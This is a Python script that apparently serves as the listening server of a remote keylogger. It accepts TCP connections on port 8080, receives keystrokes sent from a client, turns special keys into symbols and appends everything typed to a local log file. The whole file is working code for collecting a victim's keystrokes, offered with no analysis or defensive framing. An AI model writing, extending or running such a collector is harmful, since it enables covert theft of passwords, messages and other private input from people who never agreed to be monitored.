#!/usr/bin/env python3
import socket
import threading

HEADER = 64
PORT = 8080
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_KEY = "!DISCONNECT"

# socket initiation
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

def handle_client(conn, addr): 
    print(f"[*] {addr} CONNECTED! ")
    print("[-] WAITING FOR INCOMING KEY STROKES")
    connected = True 
    while connected: 
        msg_len = conn.recv(HEADER).decode(FORMAT)
        if msg_len: 
            msg_len = int(msg_len)
            key_pressed = conn.recv(msg_len).decode(FORMAT)
            if key_pressed == DISCONNECT_KEY: 
                connected = False

            # export message and save it locally 
            logF = open("log.txt", "a")
            append_text = ""
            if key_pressed == "Key.space":
                append_text = " "
            elif key_pressed == "Key.enter":
                append_text = " ↩ \n"
            elif key_pressed == "Key.shift" or key_pressed == "Key.caps_lock":
                pass
            elif key_pressed == "Key.tab":
                append_text = " [tab] "
            elif key_pressed == "Key.backspace":
                append_text= " ⌫ "
            elif key_pressed == "Key.cmd":
                append_text = " ⌘ "
            elif key_pressed == "Key.ctrl":
                append_text = " [ctrl] "
            elif key_pressed == "Key.alt":
                append_text = " ⌥ "
            elif key_pressed == "Key.up":
                append_text = " ↑ "
            elif key_pressed == "Key.down":
                append_text = " ↓ "
            elif key_pressed == "Key.right":
                append_text = " → "
            elif key_pressed == "Key.left":
                append_text = " ← "
            else: 
                append_text = key_pressed
            logF.write(f"{append_text}")
            print(append_text)
    # close socket
    conn.close()
    print("[!] USER DISCONNECTED")


def start(): 
    server.listen()
    print(f"[*] LISTENING on {SERVER}")
    while True: 
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()

start()
